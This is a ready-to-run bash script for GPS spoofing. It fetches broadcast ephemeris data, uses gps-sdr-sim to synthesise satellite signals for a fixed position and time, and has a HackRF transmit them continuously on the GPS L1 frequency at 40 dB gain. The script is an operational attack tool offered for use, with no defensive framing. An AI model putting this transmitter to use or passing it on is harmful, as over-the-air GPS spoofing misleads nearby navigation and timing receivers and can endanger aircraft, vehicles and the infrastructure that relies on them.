#!/usr/bin/env bash
set -e

### ─── CONFIG ───────────────────────────────────────────────────────────
LAT=28.6139
LON=77.2090
ALT=100

UTC_TIME="2025/05/25,12:00:00"
DURATION=600

SAMPLE_RATE=2600000
TX_FREQ=1575420000
TX_GAIN=40
### ───────────────────────────────────────────────────────────────────────

# Compute current Year and Day-of-Year (DOY)
YEAR=$(date -u +%Y)
DOY=$(date -u +%j)             # e.g. 145 for May 25

FILE="brdc${DOY}0.25n"
GZ="${FILE}.gz"
URL="https://igs.bkg.bund.de/root_ftp/BRDC/${YEAR}/${FILE}.gz"

# Download only if neither the .n file nor the .gz exist
if [[ -f "${FILE}" ]]; then
  echo "→ Ephemeris ${FILE} already exists; skipping download."
elif [[ -f "${GZ}" ]]; then
  echo "→ Compressed ephemeris ${GZ} found; will decompress."
else
  echo "→ Downloading ephemeris: ${URL}"
  wget -q --show-progress "$URL" -O "${GZ}"
fi

# Decompress only if the .n is missing
if [[ ! -f "${FILE}" ]]; then
  echo "→ Decompressing ${GZ}..."
  gunzip -f "${GZ}"
else
  echo "→ ${FILE} already decompressed; skipping."
fi

echo
echo "→ Generating spoof file (gpssim.bin) at ${LAT},${LON},${ALT}, UTC ${UTC_TIME}, duration ${DURATION}s"
./gps-sdr-sim \
  -e "${FILE}" \
  -l ${LAT},${LON},${ALT} \
  -t "${UTC_TIME}" \
  -d ${DURATION} \
  -v > /dev/null

echo
echo "→ Starting continuous HackRF transmission"
echo "   Frequency : ${TX_FREQ}  Hz"
echo "   Sample rate: ${SAMPLE_RATE} Hz"
echo "   TX gain    : ${TX_GAIN}   dB"
echo

while true; do
  hackrf_transfer \
    -t gpssim.bin \
    -f ${TX_FREQ} \
    -s ${SAMPLE_RATE} \
    -a 1 \
    -x ${TX_GAIN} \
    -R
  sleep 1
done
